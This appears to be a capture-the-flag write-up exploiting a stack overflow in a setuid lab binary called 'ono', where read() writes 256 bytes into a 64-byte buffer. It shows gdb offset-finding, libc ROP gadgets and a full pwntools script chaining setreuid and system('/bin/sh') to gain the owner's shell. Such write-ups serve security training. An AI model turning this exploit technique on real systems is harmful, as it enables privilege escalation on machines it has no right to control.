# Level01 — ono

## Initial checks

We use these checks at the start of every challenge, to see what protections the binary has and who owns it.

```
level01@rainfall:~$ pwn checksec ./ono
[*] '/home/level01/ono'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

What matters here:
- **No canary found**: nothing stops us from overwriting the return address.
- **No PIE (0x400000)**: the binary's own code and data load at the same fixed address every run.
- **Partial RELRO**: not relevant here, we're not touching the GOT.

```
level01@rainfall:~$ file ./ono
./ono: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f29da6c8ea16be8b4ac4b357ef09886f3b5b6d30, for GNU/Linux 3.2.0, not stripped
level01@rainfall:~$ ls -lh ./ono
-rwsr-x--- 1 flag01 level01 17K Jun  9 23:13 ./ono
```

The `s` in `-rwsr-x---` is the setuid bit: owned by `flag01`, runs with `flag01`'s privileges no matter who executes it. The exploit's `FLAG00` constant (`1018`) is `flag01`'s uid, taken from the script rather than a separate `id flag01` run here.

```
level01@rainfall:~$ ldd ./ono
        linux-vdso.so.1 (0x00007ffff7fc3000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
```

Same `libc` base as before (`0x7ffff7c00000`), ASLR is disabled on this box, so that address holds for our exploit process too.

## The vulnerability

```c
char op_id[OPERATOR_LEN];   // OPERATOR_LEN = 64

print_header();
read(STDIN_FILENO, op_id, 256);
```

`op_id` is a 64-byte stack buffer, but `read()` is told it can write up to **256** bytes into it. `read()` doesn't know or care about the real size of `op_id`, it just writes whatever it's told. Sending more than 64 bytes overflows into the saved `RBP` and the saved return address above it, the same mechanism as `level00`, just reached through a mismatched `read()` length instead of an unbounded `gets()`.

Worth noting: the binary also contains `maintenance_exec()`, which calls `setreuid(geteuid(), geteuid())` then `execl("/bin/sh", "sh", NULL)` if called with `code == 0xdeadbeef`. It's dead code, nothing in `main()` ever calls it, but it's a ready-made "spawn a privileged shell" function already sitting in the binary. It isn't used by this exploit (the exploit builds its own chain in `libc` instead), but jumping straight into it with `rdi = 0xdeadbeef` would be a valid, shorter alternative.

## Finding the offset to the return address

```
level01@rainfall:~$ pwn cyclic 200 > /tmp/pattern
level01@rainfall:~$ gdb -nx ./ono
(gdb) catch signal SIGSEGV
(gdb) run < /tmp/pattern
...
Program received signal SIGSEGV, Segmentation fault.
0x000000000040144b in run_diagnostic ()
(gdb) print $rbp
$1 = (void *) 0x6161616c61616161
(gdb) quit
level01@rainfall:~$ pwn cyclic -l 0x6161616c61616161
64
```

On this binary the crash happens *inside* `run_diagnostic()`, before it even gets to `ret` — the corrupted `RBP` already breaks a stack-relative access, so the faulting address is just some instruction inside the function, not the pattern itself. `catch signal SIGSEGV` stops the process at the fault instead of letting it die, so we can read `$rbp` directly: `pwn cyclic -l` on that value gives **64**, the distance from the start of `op_id` to the saved `RBP`. The saved `RIP` sits 8 bytes further, right above it, so the real offset is `64 + 8 = 72`.

## Choosing the target: libc gadgets

Same approach as `level00`: `setreuid(1018, 1018)` to become `flag01`, then `system("/bin/sh")`.

```
level01@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret"
level01@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rsi; pop r15; ret"
level01@rainfall:~$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "ret"
```

Same three gadgets as before: `pop rdi ; ret` for the 1st argument, `pop rsi ; pop r15 ; ret` for the 2nd, and a bare `ret` for 16-byte stack alignment before `system()`.

## Manual exploitation walkthrough

Confirm the offset with no real target yet:

```
level01@rainfall:~$ python3 -c "print('A'*72 + 'B'*8)" | ./ono
```

This crashes on `0x4242424242424242`, confirming 72 bytes of padding.

Then the chain, right after the padding:

```
payload = b'A' * 72
payload += p64(pop_rdi)       # pop rdi ; ret
payload += p64(1018)          # -> rdi = 1018 (new ruid)
payload += p64(pop_rsi)       # pop rsi ; pop r15 ; ret
payload += p64(1018)          # -> rsi = 1018 (new euid)
payload += p64(0)             # -> r15 = junk, doesn't matter
payload += p64(setreuid_addr) # setreuid(1018, 1018)
payload += p64(ret_gadget)    # extra ret, fixes 16-byte alignment
payload += p64(pop_rdi)       # pop rdi ; ret
payload += p64(binsh_addr)    # -> rdi = address of "/bin/sh"
payload += p64(system_addr)   # system("/bin/sh")
```

Sent with stdin kept open, so the spawned shell can read further commands:

```
level01@rainfall:~$ (python3 -c "..." ; cat) | ./ono
$ id
uid=1018(flag01) gid=1020(level01) groups=1020(level01),1002(flaggroup)
```

The `exploit.py` below assembles exactly this into one script.

## Stack layout during the overflow

```text
high address in memory:
+-----------------------+
|    ROP chain          |
+-----------------------+
|     saved RIP         |   <-- overwritten
+-----------------------+
| saved RBP             |
+-----------------------+
| op_id[64]             |
+-----------------------+
low address in memory
```

No padding layer this time: `op_id[64]` sits directly below the saved `RBP`, so 72 bytes of filler covers both before we reach the saved `RIP`.

## Exploit script

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
context.log_level = 'error'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000

FLAG00 = 1018
OFFSET = 72

system   = libc.symbols['system']
setreuid = libc.symbols['setreuid']
binsh    = next(libc.search(b'/bin/sh'))

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(FLAG00)
payload += p64(pop_rsi)
payload += p64(FLAG00)
payload += p64(FLAG00)
payload += p64(setreuid)
payload += p64(rop.ret[0])
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sys.stdout.buffer.write(payload)
```

## Running it

```
(python3 exploit.py ; cat) | ./ono
```